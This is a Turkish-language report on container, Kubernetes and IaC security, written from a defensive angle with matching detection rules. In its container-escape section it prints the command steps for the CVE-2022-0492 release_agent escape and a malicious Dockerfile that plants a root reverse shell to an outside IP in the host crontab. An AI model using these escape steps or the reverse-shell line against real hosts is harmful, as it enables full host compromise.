@@ -1,0 +1,518 @@
+# **Bulut Yerlisi Altyapılarda Savunma Derinliği (Defense in Depth) Güvenlik Mimarisi: Konteyner İzolasyonu, Kubernetes Güvencesi ve Kod Olarak Altyapı (IaC) Güvenlik Analizi**
+
+Modern kurumsal ekosistemler, monolitik yapılardan mikroservis mimarilerine ve bulut yerlisi (cloud-native) topolojilere evrilirken, siber tehdit yüzeyinde de radikal bir genişleme meydana gelmiştir. Geleneksel çevre güvenlik mimarileri (perimeter-based security), sınırları belirsizleşen dinamik bulut ortamlarında yetersiz kalmaktadır1. Bu durum, altyapının her katmanında (fiziksel donanım, ana makine işletim sistemi, konteyner çalışma zamanı, orkestrasyon katmanı, uygulama kodları ve tedarik zinciri) bağımsız güvenlik kontrollerinin tesis edilmesini öngören "Savunma Derinliği" (Defense in Depth) felsefesinin uygulanmasını zorunlu kılmaktadır3. Bu araştırma raporu; modern konteyner izolasyon teknolojilerinden Kubernetes güvenlik mimarilerine, tedarik zinciri güvencesinden Kod Olarak Altyapı (IaC) denetimlerine kadar uzanan geniş bir yelpazeyi teknik, operasyonel, ofansif ve defansif açılardan incelemektedir. Ayrıca geliştirilen teknik kuramları, ulusal ve uluslararası güvenlik standartları ile Türkiye'deki yerel yasal mevzuat uyumluluğu çerçevesinde ele almaktadır6.
+
+## **1\. Docker Mimarisi ve Linux Çekirdek İzolasyonunun Derin Analizi**
+
+Konteyner teknolojileri, geleneksel sanal makinelerin (VM) aksine kendi hipervizörlerine veya bağımsız işletim sistemi çekirdeklerine sahip değildir5. Konteynerler, ana makine (host) işletim sisteminin çekirdeğini paylaşan ve Linux çekirdeğinin sunduğu mantıksal soyutlama ve kaynak sınırlandırma yetenekleriyle izole edilen özel süreçlerdir (processes)5. Bu izolasyonun iki temel sütunu bulunmaktadır: Namespaces (İsim Alanları) ve Control Groups (Cgroups)10.
+
+### **Linux Namespaces (İsim Alanları) ile Mantıksal Soyutlama Mekanizmaları**
+
+Namespaces, bir sürecin sistem kaynaklarını görme yeteneğini kısıtlayarak her konteyner için sanal bir küresel alan yaratır11. Linux çekirdeğinde konteyner izolasyonunu sağlayan temel isim alanları şunlardır:
+
+* **PID (Process ID) Namespace:** Konteyner içindeki süreçlerin ana makinedeki diğer süreçlerden izole edilmesini sağlar13. Konteyner içindeki ana süreç PID 1 olarak başlar, ancak ana makine perspektifinden bakıldığında sıradan ve yüksek değerli bir PID ile temsil edilir.  
+* **NET (Network) Namespace:** Her konteynere bağımsız ağ arayüzleri, IP yönlendirme tabloları, güvenlik duvarı kuralları (iptables/nftables) ve port alanları tahsis eder13.  
+* **MNT (Mount) Namespace:** Sürecin dosya sistemi bağlama noktalarını (mount points) izole ederek konteynerin yalnızca kendisine tahsis edilen kök dosya sistemini görmesini sağlar13. Bu işlem, chroot benzeri ancak daha güvenli bir pivot\_root mekanizması ile gerçekleştirilir.  
+* **IPC (Inter-Process Communication) Namespace:** Sistem V IPC nesneleri ve POSIX mesaj kuyrukları gibi süreçler arası iletişim kanallarını sınırlar13.  
+* **UTS (UNIX Timesharing System) Namespace:** Konteynerin bağımsız ana makine adı (hostname) ve alan adına (domain name) sahip olmasına olanak tanır.  
+* **USER Namespace:** Konteyner içindeki bir kullanıcının kullanıcı kimliğini (UID) ve grup kimliğini (GID) ana makinedeki farklı kimliklerle eşleştirir12. Bu sayede, konteyner içinde root (UID 0\) yetkisine sahip olan bir süreç, ana makinede yetkisiz sıradan bir kullanıcı (örneğin UID 10001\) olarak çalıştırılabilir12.  
+* **CGROUP Namespace:** Sürecin kendi cgroup hiyerarşisini görmesini sınırlandırarak alt cgroup'ların ana makine hiyerarşisine erişmesini engeller.
+
+\+-------------------------------------------------------------------+  
+| Containerized App | | Süreçler yalnızca kendi soyutlanmış ad alanlarını görür | \+---------------------------------+---------------------------------+  
+| (Sistem Çağrıları / Syscalls) v \+---------------------------------+---------------------------------+  
+| Linux Namespaces | | \[PID\] \[NET\] \[MNT\] \[IPC\] \[UTS\] \[USER\] \[CGROUP\] | \+---------------------------------+---------------------------------+ | v \+---------------------------------+---------------------------------+  
+| Control Groups (Cgroups) | | v1: Dağınık/Çoklu Hiyerarşi | v2: Tekli Birleşik Hiyerarşi | | (Güvenlik Zafiyetlerine Gebe) | (Güvenli Alt Ağaç Delegasyonu) | \+---------------------------------+---------------------------------+ | v \+-------------------------------------------------------------------+  
+| Host Linux Kernel | \+-------------------------------------------------------------------+
+
+### **Control Groups (Cgroups) ile Kaynak Yönetimi ve Sınırlandırma**
+
+Cgroups, süreç gruplarının kaynak tüketimini (CPU, bellek, disk G/Ç, ağ bant genişliği ve süreç sayısı) izleyen ve sınırlayan çekirdek mekanizmasıdır14. Bu mekanizma, çok kiracılı (multi-tenant) ortamlarda bir konteynerin tüm sistem kaynaklarını tüketerek diğer servislerin durmasına yol açmasını (Denial of Service \- DoS veya "Noisy Neighbor" etkisi) engeller15.  
+Cgroups mimarisi v1 ve v2 olmak üzere iki ana versiyona sahiptir10. Kurumsal altyapı tasarımlarında bu iki versiyon arasındaki mimari farkların bilinmesi kritik önem arz eder:
+
+| Özellik / Parametre | Cgroups v1 | Cgroups v2 |
+| :---- | :---- | :---- |
+| **Hiyerarşi Yapısı** | Çoklu bağımsız denetleyici hiyerarşisi (Her kaynak denetleyicisi için ayrı bir ağaç)10. | Tek ve birleşik hiyerarşi ağacı (Tüm denetleyiciler tek bir yapıya bağlıdır)10. |
+| **Güvenlik ve Delegasyon** | Güvensiz alt ağaç delegasyonu; konteyner içinden ana makine cgroup dosyalarına erişim risklidir14. | Güvenli alt ağaç delegasyonu (Safe sub-tree delegation) ve rootless konteyner desteği14. |
+| **Kaynak Entegrasyonu** | Bellek ve disk yazma (writeback) limitleri arasında koordinasyon yoktur. | Bellek, G/Ç ve CPU kontrolcüleri arasında tam entegrasyon ve koordinasyon. |
+| **Özel Yetenekler** | Bulunmuyor. | PSI (Pressure Stall Information) ile kaynak dar boğazlarının proaktif izlenmesi14. |
+| **Kaçış Primitifleri** | release\_agent gibi mekanizmalar yazma yetkisiyle konteyner kaçışına yol açabilir10. | release\_agent kaldırılmıştır, eBPF tabanlı aygıt denetimi gibi güvenli mekanizmalar kullanılır10. |
+
+## **2\. Saldırı ve Savunma Dengesi: Konteyner Kaçış (Container Escape) Vektörleri**
+
+Konteyner teknolojilerinde en kritik tehdit vektörlerinden biri "Konteynerden Ana Makineye Kaçış" (Container Escape / Breakout) saldırılarıdır5. Saldırganlar, paylaşımlı çekirdek üzerindeki zafiyetleri veya zayıf yapılandırmaları sömürerek konteyner sınırlarını aşar ve ana makine üzerinde tam yetkili kod yürütme hakkı elde eder5.
+
+### **CVE-2022-0492: Cgroups v1 release\_agent Sömürüsü ve Kaçış Dinamikleri**
+
+Cgroups v1 mimarisindeki release\_agent özelliği, bir cgroup içindeki tüm süreçler sonlandığında çekirdek tarafından otomatik olarak çalıştırılacak bir komut dosyasının yolunu tanımlamaya yarar11.  
+**Ofansif Sömürü Metodolojisi:** Eğer bir konteyner içerisinde CAP\_SYS\_ADMIN yetkisi tanımlanmışsa veya cgroup dosya sistemi yazılabilir olarak bağlanmışsa, saldırgan şu adımlarla ana makineye kaçabilir12:
+
+1. Konteyner içinde geçici bir cgroup hiyerarşisi oluşturulur ve bağlanır12.  
+2. Konteyner içinden erişilebilen ancak ana makine dosya sistemindeki yolu tahmin edilebilen bir kaçış betiği (payload) yazılır.  
+3. Bağlanan geçici cgroup hiyerarşisinin release\_agent dosyasına, bu betiğin ana makinedeki yolu yazılır11.  
+4. Cgroup içine bir süreç eklenir ve hemen sonlandırılarak "cgroup boşaldı" tetiklemesi (trigger) oluşturulur12.  
+5. Çekirdek, release\_agent içinde tanımlı betiği ana makine üzerinde root yetkileriyle çalıştırır11.
+
+| Sömürü Adımı | Saldırganın Gerçekleştirdiği Eylem | Sistem Seviyesindeki Karşılığı |
+| :---- | :---- | :---- |
+| **1\. Bağlama (Mount)** | mount \-t cgroup \-o rdma cgroup /tmp/cgroup | Cgroup v1 dosya sisteminin konteyner içine bağlanması12. |
+| **2\. Kayıt (Registration)** | echo 1 \> /tmp/cgroup/notify\_on\_release | Bildirim mekanizmasının aktif hale getirilmesi. |
+| **3\. Yol Belirleme** | echo "/var/lib/docker/overlay2/.../payload.sh" \> /tmp/cgroup/release\_agent | Çekirdeğe tetikleme anında çalıştırılacak host yolunun verilmesi11. |
+| **4\. Tetikleme (Trigger)** | sh \-c "echo $$\> /tmp/cgroup/c1/tasks && kill \-9$$" | Sürecin cgroup'a yazılması ve sonlandırılarak cgroup'un boşaltılması12. |
+
+**Defansif Engelleme ve Algılama:**
+
+* **Engelleme:** Konteynerlerin CAP\_SYS\_ADMIN yetkisiyle çalıştırılması engellenmeli, seccomp profilleriyle mount sistem çağrısı sınırlandırılmalı ve rootless konteyner çalışma zamanlarına geçiş yapılmalıdır12.  
+* **Algılama (Host Auditd Rules & Wazuh Korelasyonu):** Ana makinede auditd servisinin cgroup yazma işlemlerini izlemesi sağlanmalı ve bu loglar Wazuh SIEM'e aktarılmalıdır21.
+
+/etc/audit/rules.d/audit.rules dosyasına eklenecek kural şu şekildedir21: \-w /sys/fs/cgroup/ \-p wa \-k cgroup\_modification  
+Wazuh sunucusundaki /var/ossec/etc/rules/local\_rules.xml dosyasına eklenecek korelasyon kuralı ise şöyledir23:
+
+XML  
+\<group name\="audit,container\_escape,"\>  
+  \<rule id\="100301" level\="12"\>  
+    \<if\_sid\>80700\</if\_sid\> \<\!-- Varsayılan auditd olay yakalama kural ID'si \--\>  
+    \<field name\="audit.key"\>cgroup\_modification\</field\>  
+    \<match\>release\_agent\</match\>  
+    \<description\>Şüpheli Cgroup v1 release\_agent Modifikasyonu \- Olası Konteyner Kaçış Teşebbüsü\!\</description\>  
+    \<mitre\>  
+      \<id\>T1611\</id\> \<\!-- Escape to Host \--\>  
+    \</mitre\>  
+  \</rule\>  
+\</group\>
+
+### **CVE-2024-21626: runc Dosya Tanımlayıcı Sızıntısı ve WORKDIR Manipülasyonu**
+
+"Leaky Vessels" adıyla anılan bu zafiyet, düşük seviyeli konteyner çalıştırma aracı olan runc'ın yeni bir süreç başlatırken dahili dosya tanımlayıcılarını (file descriptors) kapatmamasından kaynaklanır18.  
+**Ofansif Sömürü Metodolojisi:** Saldırganlar iki farklı varyant kullanarak bu zafiyeti sömürebilir:
+
+* **Varyant A (Kötü Niyetli İmaj):** Saldırgan, hazırladığı Dockerfile içinde WORKDIR parametresini /proc/self/fd/9 (runc tarafından açık bırakılan bir dosya tanımlayıcısı) olarak ayarlar26. Kullanıcı bu imajı çektiğinde ve çalıştırdığında, konteynerin çalışma dizini ana makine dosya sistemindeki bir dizin haline gelir ve ../../ geçişleriyle tüm ana makineye erişim sağlanır26.  
+* **Varyant B (Çalışan Konteynere Sızma):** Saldırgan, çalışan bir konteyner içinde docker exec komutunu tetikleyerek çalışma dizinini /proc/self/fd/\[ID\] olarak manipüle eder ve ana makine ikili dosyalarını (binaries) ezerek tam kontrol sağlar25.
+
+Dockerfile  
+\# CVE-2024-21626 Sömürüsü için Tasarlanmış Malicious Dockerfile Örneği  
+FROM ubuntu:22.04  
+\# runc sızıntı dosya tanımlayıcısı üzerinden host dizinine chdir yapılması  
+WORKDIR /proc/self/fd/8  
+\# Host üzerindeki crontab dosyasına tersine kabuk (reverse shell) enjekte edilmesi  
+RUN cd ../../../../../etc && echo "\* \* \* \* \* root bash \-i \>& /dev/tcp/192.168.1.150/4444 0\>&1" \>\> crontab
+
+**Defansif Engelleme ve Algılama:**
+
+* **Engelleme:** runc sürümü acilen 1.1.12 veya üzerine yükseltilmelidir18.  
+* **Algılama (Falco Kuralı):** Gerçek zamanlı sistem çağrısı analizi yapan Falco ile süreç oluşturma esnasında procfs altındaki dosya tanımlayıcılarının çalışma dizini olarak kullanılma girişimleri tespit edilebilir4.
+
+Aşağıdaki Falco kuralı, CVE-2024-21626 sömürü girişimlerini yakalamak üzere tasarlanmıştır31:
+
+YAML  
+\- rule: runc\_FD\_Leak\_Escape\_Attempt  
+  desc: Runc üzerinden dosya tanımlayıcısı sızıntısı ve ana makineye kaçış teşebbüsünün tespiti.  
+  condition: \>  
+    spawned\_process and   
+    (evt.type \= execve and proc.cwd startswith "/proc/self/fd") or  
+    (evt.type in (open, openat, openat2) and fd.name glob "/proc/\*/cwd/\*") or  
+    (evt.type in (symlink, symlinkat) and fs.path.target startswith "/proc/self/fd/")  
+  output: \>  
+    Şüpheli Konteyner Kaçış Girişimi Algılandı (user=%user.name command=%proc.cmdline   
+    cwd=%proc.cwd container\_id=%container.id image=%container.image.repository)  
+  priority: CRITICAL  
+  tags: \[container, mitre\_privilege\_escalation, CVE-2024-21626\]
+
+## **3\. Kubernetes (K8s) Güvenlik Kontrolleri ve Ağ Sıkılaştırma Mimarisi**
+
+Kubernetes orkestrasyon katmanında varsayılan kurulumlar, tüm podların birbiriyle kısıtlamasız konuşmasına izin verir1. Bu durum, ağ içi yatay hareket (lateral movement) için ciddi risk oluşturur1.
+
+### **Kubernetes Ağ Politikaları (Network Policies) ile Mikro-Segmentasyon**
+
+NetworkPolicy kaynakları, podlar arası ve dış dünya ile olan ağ trafiğini Layer 3 ve Layer 4 seviyesinde kısıtlayan mikro-güvenlik duvarlarıdır1. NetworkPolicy'nin aktif olarak trafiği engelleyebilmesi için kümede Calico veya Cilium gibi bir Container Network Interface (CNI) eklentisinin bulunması şarttır1.  
+Kurumsal mimarilerde uygulanması gereken en temel pratik, her namespace için varsayılan olarak tüm giriş ve çıkış trafiğini engelleyen "Default Deny" kuralının yazılması ve ardından yalnızca meşru akışlara izin verilmesidir2.
+
+YAML  
+\# 1\. Adım: Tüm Giriş (Ingress) ve Çıkış (Egress) Trafiğini Engelleyen "Default Deny" Politikası  
+apiVersion: networking.k8s.io/v1  
+kind: NetworkPolicy  
+metadata:  
+  name: default-deny-all  
+  namespace: finance-prod  
+spec:  
+  podSelector: {} \# Tüm podları seçer  
+  policyTypes:  
+  \- Ingress  
+  \- Egress  
+\---  
+\# 2\. Adım: Yalnızca Belirli Kaynaklardan Gelen Veritabanı Erişimine İzin Veren Ingress Politikası  
+apiVersion: networking.k8s.io/v1  
+kind: NetworkPolicy  
+metadata:  
+  name: allow-backend-to-postgres  
+  namespace: finance-prod  
+spec:  
+  podSelector:  
+    matchLabels:  
+      app: postgres-db \# Hedef pod  
+  policyTypes:  
+  \- Ingress  
+  ingress:  
+  \- from:  
+    \- podSelector:  
+        matchLabels:  
+          app: transaction-api \# Yalnızca bu etiketli podlardan erişim al  
+    ports:  
+    \- protocol: TCP  
+      port: 5432  
+\---  
+\# 3\. Adım: Dış Dünyadaki Yalnızca Belirli Bir IP Aralığına Erişim İzni Veren Egress Politikası  
+apiVersion: networking.k8s.io/v1  
+kind: NetworkPolicy  
+metadata:  
+  name: restrict-egress-payment-gateway  
+  namespace: finance-prod  
+spec:  
+  podSelector:  
+    matchLabels:  
+      app: transaction-api \# Kaynak pod  
+  policyTypes:  
+  \- Egress  
+  egress:  
+  \- to:  
+    \- ipBlock:  
+        cidr: 196.11.24.0/24 \# Yalnızca banka ödeme geçidinin IP bloğuna izin ver  
+    ports:  
+    \- protocol: TCP  
+      port: 443
+
+### **Rol Tabanlı Erişim Kontrolü (RBAC) Sıkılaştırma Parametreleri**
+
+Kubernetes API sunucusuna erişim, Rol Tabanlı Erişim Kontrolü (RBAC) ile denetlenir33. RBAC konfigürasyonlarındaki aşırı izinler (over-privileged roles), saldırganların küme yönetimini ele geçirmesine sebep olabilir13.
+
+| Kritik Hata / Zafiyet | Güvenlik Riski | Güvenli Konfigürasyon ve Çözüm |
+| :---- | :---- | :---- |
+| **Hassas Kaynaklarda Joker (\*) Kullanımı** | Saldırganın tüm API grupları ve kaynaklar üzerinde tam yetki kazanması13. | Kaynakların ve fiillerin (verbs) tek tek tanımlanması; \* kullanımından kaçınılması13. |
+| **Varsayılan Servis Hesaplarının (Default SA) Aşırı Yetkilendirilmesi** | Pod içine sızan bir saldırganın varsayılan token ile API üzerinde yetkisiz işlemler gerçekleştirmesi13. | automountServiceAccountToken: false parametresiyle token montajının kapatılması13. |
+| **secrets Kaynağına Okuma Yetkisi Verilmesi** | Kümedeki tüm veri tabanı şifrelerinin, API anahtarlarının ve sertifikaların ele geçirilmesi34. | Okuma yetkisinin sınırlandırılması ve alternatif olarak sızdırmaz harici şifre yönetim sistemlerinin (Vault vb.) kullanılması. |
+
+### **Pod Güvenlik Standartları (PSS) ve Pod Güvenlik Kabulü (PSA)**
+
+Eski sürüm Kubernetes yapılarındaki *Pod Security Policies (PSP)* mekanizmasının yerini, kullanımı daha kararlı ve standart olan **Pod Security Standards (PSS)** ve **Pod Security Admission (PSA)** almıştır35. PSS, üç farklı güvenlik profili tanımlar35:
+
+1. **Privileged (Ayrıcalıklı):** Tamamen kısıtlamasız bir politikadır37. Sistem bileşenleri ve güvenilir altyapı podları haricinde kesinlikle kullanılmamalıdır35.  
+2. **Baseline (Temel):** Bilinen ayrıcalık yükseltme yöntemlerini engeller35. Varsayılan uygulama podları için idealdir. Host ağ alanı, host PID alanı ve ham yeteneklerin eklenmesini engeller35.  
+3. **Restricted (Kısıtlı):** En sıkı güvenlik kontrollerini uygular35. Podların kök dışı (non-root) çalışmasını zorunlu kılar, tüm yetenekleri düşürür (drop: \["ALL"\]), seccomp profillerini varsayılana çeker ve dosya sistemini salt okunur yapar35.
+
+PSA, namespace seviyesindeki etiketlerle (labels) tetiklenir ve üç farklı modda çalışabilir36:
+
+* enforce: Kural ihlali yapan podların oluşturulmasını doğrudan engeller37.  
+* warn: Podun oluşturulmasına izin verir ancak kullanıcıya bir uyarı mesajı döner37.  
+* audit: İhlali engellemez ancak denetim (audit) loglarına kayıt düşer37.
+
+Aşağıdaki YAML örneğinde, üretim ortamı için kısıtlı (restricted) profili doğrudan dayatan, geliştirme ortamı için ise temel (baseline) profili uygulayıp olası ihlalleri denetleyen bir isim alanı konfigürasyonu yer almaktadır35:
+
+YAML  
+apiVersion: v1  
+kind: Namespace  
+metadata:  
+  name: app-prod  
+  labels:  
+    \# Üretim ortamında kesinlikle restricted profilini dayat  
+    pod-security.kubernetes.io/enforce: restricted  
+    pod-security.kubernetes.io/enforce-version: latest  
+    pod-security.kubernetes.io/warn: restricted  
+    pod-security.kubernetes.io/warn-version: latest  
+\---  
+apiVersion: v1  
+kind: Namespace  
+metadata:  
+  name: app-dev  
+  labels:  
+    \# Geliştirme ortamında baseline profilini dayat, kısıtlı profili için yalnızca uyar ve logla  
+    pod-security.kubernetes.io/enforce: baseline  
+    pod-security.kubernetes.io/enforce-version: latest  
+    pod-security.kubernetes.io/warn: restricted  
+    pod-security.kubernetes.io/warn-version: latest  
+    pod-security.kubernetes.io/audit: restricted  
+    pod-security.kubernetes.io/audit-version: latest
+
+## **4\. Konteyner İmaj Güvenliği, Registry Güvenliği ve Tedarik Zinciri Bütünlüğü**
+
+Konteyner güvenliği henüz yazılım geliştirme aşamasında, yani imajın inşa edildiği (build) ve depolandığı (registry) evrede başlar3. Tedarik zinciri saldırılerini engellemek amacıyla imajların taranması ve dijital olarak imzalanması zorunludur41.
+
+### **Trivy Entegrasyonu ile Güvenlik Açığı Taraması ve Wazuh SIEM Entegrasyonu**
+
+Konteyner imajlarındaki zafiyetlerin proaktif tespiti için CI/CD süreçlerinde ve çalışan konteyner ana makinelerinde Trivy veya Snyk gibi araçlar kullanılır43. Bu araçların çıktıları kurumsal SOC süreçlerine dahil edilerek merkezi olarak izlenmelidir43.  
+**Operasyonel Mimari Akışı:**
+
+1. Ana makinede kurulu olan Wazuh Agent, periyodik bir command wodle (/var/ossec/etc/ossec.conf) ile trivy\_scan.sh betiğini tetikler43.  
+2. Trivy, sistemdeki aktif imajları tarayarak JSON formatında bir rapor üretir43.  
+3. Wazuh Agent, bu JSON çıktısını Wazuh Manager sunucusuna iletir43.  
+4. Sunucu tarafındaki özel dekoder ve kurallar, tarama çıktısını işleyerek kritik zafiyetler için alarm üretir43.
+
+Aşağıda, Wazuh Agent üzerindeki command modül konfigürasyonu gösterilmiştir43:
+
+XML  
+\<wodle name\="command"\>  
+  \<disabled\>no\</disabled\>  
+  \<command\>/var/ossec/custom-script/trivy\_scan.sh\</command\>  
+  \<interval\>1d\</interval\>  
+  \<ignore\_output\>no\</ignore\_output\>  
+  \<run\_on\_start\>yes\</run\_on\_start\>  
+\</wodle\>
+
+Wazuh Manager sunucusunda (/var/ossec/etc/rules/trivy\_rules.xml) tanımlanması gereken özel bir Trivy alarm kural kümesi ise şöyledir43:
+
+XML  
+\<group name\="trivy\_scan,vulnerability\_detection,"\>  
+  \<\!-- Parent Rule: Trivy tarama çıktısının algılanması \--\>  
+  \<rule id\="100501" level\="3"\>  
+    \<decoded\_as\>json\</decoded\_as\>  
+    \<field name\="vulnerability.scanner"\>trivy\</field\>  
+    \<description\>Trivy Konteyner İmaj Tarama Çıktısı Alındı.\</description\>  
+  \</rule\>
+
+  \<\!-- Child Rule: Kritik (Critical) Seviyedeki Zafiyetlerin Tespiti \--\>  
+  \<rule id\="100502" level\="13"\>  
+    \<if\_sid\>100501\</if\_sid\>  
+    \<field name\="vulnerability.severity"\>CRITICAL\</field\>  
+    \<description\>Kritik Seviyede Zafiyet İçeren Konteyner İmajı Saptandı\! Zafiyet: $(vulnerability.id), Paket: $(vulnerability.package)\</description\>  
+    \<mitre\>  
+      \<id\>T1204.002\</id\> \<\!-- Malicious File \--\>  
+    \</mitre\>  
+  \</rule\>
+
+  \<\!-- Child Rule: Yüksek (High) Seviyedeki Zafiyetlerin Tespiti \--\>  
+  \<rule id\="100503" level\="10"\>  
+    \<if\_sid\>100501\</if\_sid\>  
+    \<field name\="vulnerability.severity"\>HIGH\</field\>  
+    \<description\>Yüksek Seviyede Zafiyet İçeren Konteyner İmajı Saptandı: $(vulnerability.id)\</description\>  
+  \</rule\>  
+\</group\>
+
+### **Cosign ve Kyverno ile İmaj İmzalama ve Webhook Doğrulama Mimarisi**
+
+İmaj taraması tek başına yeterli değildir; kötü niyetli aktörlerin imaj deposuna (registry) yetkisiz erişim sağlayarak meşru imajları manipüle etmesi (imaj zehirleme) mümkündür5. Bu riski bertaraf etmek amacıyla, imajların kriptografik olarak imzalanması ve Kubernetes kümesine yalnızca doğrulanmış imzaya sahip imajların kabul edilmesi gerekir30.  
+Geliştirici veya CI/CD aracı, Sigstore Cosign kullanarak imajı özel anahtar (private key) ile imzalar41:
+
+Bash  
+\# 1\. Kriptografik Anahtar Çiftinin Oluşturulması  
+cosign generate-key-pair k8s-cosign-key
+
+\# 2\. İmajın İnşa Edilerek İmzalanması  
+docker build \-t registry.kurum.local/finance/api:v1.1.0 .  
+docker push registry.kurum.local/finance/api:v1.1.0  
+cosign sign \--key k8s-cosign-key.key registry.kurum.local/finance/api:v1.1.0
+
+Aşağıdaki Kyverno ClusterPolicy YAML'ı, belirtilen imaj deposundan gelen tüm podların geçerli bir Cosign imzasına sahip olmasını şart koşar50:
+
+YAML  
+apiVersion: kyverno.io/v1  
+kind: ClusterPolicy  
+metadata:  
+  name: enforce-image-signing  
+  annotations:  
+    policies.kyverno.io/title: "Geçerli Cosign İmzası Bulunmayan İmajları Engelle"  
+    policies.kyverno.io/category: "Yazılım Tedarik Zinciri Güvenliği"  
+    policies.kyverno.io/severity: "high"  
+spec:  
+  validationFailureAction: Enforce \# Kural ihlalinde doğrudan engelle  
+  background: false \# Arka planda değil, gerçek zamanlı değerlendir  
+  webhookConfiguration:  
+    timeoutSeconds: 15  
+  rules:  
+  \- name: verify-cosign-signature  
+    match:  
+      any:  
+      \- resources:  
+          kinds:  
+          \- Pod  
+    verifyImages:  
+    \- imageReferences:  
+      \- "registry.kurum.local/finance/\*" \# Sadece bu depodan gelenleri denetle  
+      attestors:  
+      \- entries:  
+        \- keys:  
+            publicKeys: |-  
+              \-----BEGIN PUBLIC KEY-----  
+              MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzVl0W9Fv...  
+              \-----END PUBLIC KEY-----
+
+## **5\. Kod Olarak Altyapı (IaC) Süreçlerinde Güvenlik ve Yanlış Yapılandırma Analizi**
+
+Kod Olarak Altyapı (IaC), insan hatasını azaltarak tekrarlanabilir altyapılar kurmayı hedefler. Ancak, IaC şablonlarındaki (Terraform, Ansible) tek bir güvenlik hatası, tüm cloud altyapısının zafiyetli olarak ayağa kalkmasına neden olur1.
+
+### **IaC Dosyalarındaki Yaygın Güvenlik Hataları**
+
+* **Açıkta Kalan Hassas Veriler (Hardcoded Secrets):** AWS erişim anahtarlarının, veri tabanı şifrelerinin veya API token'ların doğrudan kod bloğu içerisine yazılması53.  
+* **Gevşek Güvenlik Grupları (Permissive Security Groups):** İnternete açık portlar tanımlanırken, kaynak adresi olarak kısıtlayıcı IP blokları yerine 0.0.0.0/0 (tüm internet) kullanılması52.  
+* **Şifrelenmemiş Depolama Birimleri:** Bulut disklerinin (EBS), nesne depolarının (S3) veya veri tabanı yedekleme alanlarının varsayılan olarak şifrelenmemiş bırakılması7.
+
+### **Checkov ile Statik Kod Analizi ve Custom YAML Kuralları**
+
+IaC kodlarının üretim ortamına dağıtılmadan önce (Shift-Left felsefesiyle) taranması için en yaygın statik analiz aracı Checkov'dur56. Checkov, tanımlanmış standart kuralların yanı sıra kurumsal ihtiyaçlara yönelik özel kuralları (Custom Policies) destekler52.  
+Aşağıda, kurumsal bir ortamda AWS S3 kovalarının (buckets) genel erişime açık (public-read veya public-read-write) olarak oluşturulmasını engelleyen ve Checkov formatında yazılmış özel bir statik analiz kuralı yer almaktadır52:
+
+YAML  
+metadata:  
+  name: "Kurumsal S3 Kovalarının Genel Erişime Açık Olmasını Engelle"  
+  id: "CKV\_AWS\_CUSTOM\_88" \# Kurumsal kural kimliği \[cite: 58\]  
+  category: "LOGGING"  
+  severity: "HIGH"  
+  scope:  
+    provider: "aws"  
+definition:  
+  cond\_type: "attribute"  
+  resource\_types:  
+    \- "aws\_s3\_bucket"  
+    \- "aws\_s3\_bucket\_acl"  
+  attribute: "acl"  
+  operator: "not\_in"  
+  value:  
+    \- "public-read"  
+    \- "public-read-write"  
+    \- "website"  
+guidelines: |  
+  Hata: Güvenlik politikası gereği kurumsal S3 kovaları genel erişime açık olamaz.  
+  Lütfen 'acl' parametresini 'private' veya 'authenticated-read' olarak güncelleyin.
+
+Bu kural, CI/CD hattına (GitHub Actions veya GitLab CI) bir pre-commit veya pre-apply adımı olarak eklenerek güvenlik ihlali barındıran kodların buluta uygulanması otomatik olarak bloke edilir54:
+
+Bash  
+\# CI/CD Pipeline Adım Örneği  
+checkov \-d ./terraform/ \--external-checks-dir ./checkov-custom-rules/ \--framework terraform
+
+## **6\. Uluslararası ve Yerel Mevzuat Standartları Uyum Matrisi**
+
+Konteyner ve bulut güvenliği, teknik bir gereksinim olmasının ötesinde yerel ve uluslararası yasal mevzuatlara uyumluluğun sağlanmasında kritik bir rol oynar6.
+
+### **Standartlar Karşılaştırma Tablosu**
+
+Aşağıdaki tablo, bu raporda ele alınan teknik önlemlerin uluslararası standartlardaki ve yerel mevzuatlardaki karşılıklarını göstermektedir:
+
+| Teknik Güvenlik Kontrolü | NIST SP 800-190 Karşılığı | CIS Controls v8 Karşılığı | ISO 27001:2022 Karşılığı | Yerel Mevzuat Uyum Matrisi (Türkiye) |
+| :---- | :---- | :---- | :---- | :---- |
+| **İmaj Taraması ve Zafiyet Yönetimi** | İmaj Güvenliği (Image Security \- 3.1)3 | Control 7: Vulnerability Management | A.8.8 Management of technical vulnerabilities | **BİGR Madde 4.3.1.1:** Siber olay ve güncelleme durum alarımlarının kurum tarafından takibi ve izlenmesi8. |
+| **Pod İzolasyonu ve Kök Dışı Çalıştırma** | Çalışma Zamanı Güvenliği (Runtime Security \- 3.4)3 | Control 12: Network Infrastructure Management | A.8.21 Security of network services | **KVKK Teknik Tedbirleri:** Veriye yetkisiz erişimin engellenmesi adına en az yetki ilkesinin tüm servislerde işletilmesi7. |
+| **Kriptografik İmaj İmzalama** | Registry ve Kaynak Doğrulama (Registry \- 3.2)3 | Control 9: Email and Web Browser Defenses | A.8.24 Use of cryptography | **BDDK Siber Güvenlik Tebliği:** Bilgi sistemleri tedarik zinciri ve bütünlük doğrulaması süreçlerinin işletilmesi6. |
+| **Ağ Politikaları (Network Policies)** | Ağ Güvenliği (Network Security \- 3.3)3 | Control 12: Network Infrastructure Management | A.8.20 Network security | **BİGR Madde 4.3.1.3:** Kurumsal ağın, bulut ortamından gelecek tehditlere karşı kesin izolasyon protokolleriyle korunması8. |
+| **Merkezi Log ve SIEM Entegrasyonu** | Orkestrasyon Güvenliği (Orchestrator \- 3.5)3 | Control 8: Audit Log Management | A.8.15 Logging / A.8.16 Monitoring | **5651 Sayılı Kanun & BDDK:** Log bütünlüğünün, NTP ile senkronize zaman damgasıyla kriptografik olarak kayıt altına alınması7. |
+
+### **Türkiye'deki Yasal Mevzuatlara Uygun Pratikler ve Loglama Yükümlülükleri**
+
+Türkiye siber güvenlik mevzuatına uyum sağlarken, bulut yerlisi altyapılarda şu kritik hususlara dikkat edilmelidir:
+
+#### **Kritik Verilerin Yurt İçinde Depolanması (BİGR Madde 4.3.1.1)**
+
+Cumhurbaşkanlığı Bilgi ve İletişim Güvenliği Rehberi (BİGR) uyarınca, kamu kurumları ve kritik altyapı niteliğindeki özel kuruluşların kritik verilerinin yurt içinde depolanması ve yurt dışına çıkışının engellenmesi zorunludur8. Hibrit bulut veya özel bulut (Private Cloud) tasarımlarında, imaj depoları (private registries) ve Kubernetes kontrol düzlemleri Türkiye sınırları içerisindeki veri merkezlerinde konumlandırılmalıdır7.
+
